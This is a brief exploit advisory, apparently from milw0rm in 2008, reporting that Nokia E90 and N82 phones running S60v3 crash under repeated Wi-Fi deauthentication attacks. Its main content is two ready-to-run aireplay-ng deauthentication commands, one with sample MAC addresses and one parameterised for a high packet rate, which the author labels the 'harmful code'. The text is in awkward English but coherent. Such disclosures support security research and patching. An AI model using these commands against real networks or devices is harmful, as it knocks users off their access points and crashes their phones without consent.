Nokia E90 and probably other devices with s60v3 crashes with aireplay

The device should be authorised on an access point

sample: aireplay-ng -0 10 -a 00:74:3B:0C:A0:5A -c 00:2A:29:F3:1F:42 wlan0

My HW:

AP= Acorp w422g

Nokia E90 v 07.40.1.2 Ra-6

For attack realisation is necessary to send DeAuth a package on the attacked
device (to throw out it from an access point), then to continue to send
packages on the device.

the Device is crashed off right after repeated authorisation on an access
point

Vulnerability is fast shown at activity on WLAN

WLAN Settings: auto

I specify a harmful code: ./aireplay-ng -x 1024 -0 230 -a $ap -c $target
$iface

Added: the vulnerable device: Nokia N82

# milw0rm.com [2008-09-14]